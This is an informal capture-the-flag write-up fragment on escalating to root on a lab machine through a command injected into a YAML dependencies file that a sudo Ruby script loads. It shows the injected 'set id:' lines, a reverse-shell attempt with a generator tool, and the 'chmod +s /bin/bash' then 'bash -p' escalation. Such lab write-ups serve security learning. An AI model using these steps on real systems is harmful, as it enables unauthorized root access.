now that we have arbirtary code execution using dependencies .yaml


to verify this again i changed the 

set id: which python 3


and i got this

henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
/usr/bin/python3



how created a python reverse shell using shellgen since it is working in python

â”Œâ”€â”€(rootðŸ’€kali)-[~/Desktop/THM/shellgen]
â””â”€# ./shellgen tun0 9001



well this was not working so checked writeup again

so it was pretty easy reverse shell was not working so we added suid bit to /bin/bash


set id: "chmod +s /bin/bash"



ran with sudo


verified suid bit using

cd /bin; ls -al | grep bash


escalated using

/bin/bash -p


and got the root shell



Here i learned to enumerate properly and b aware of the rabbit holes
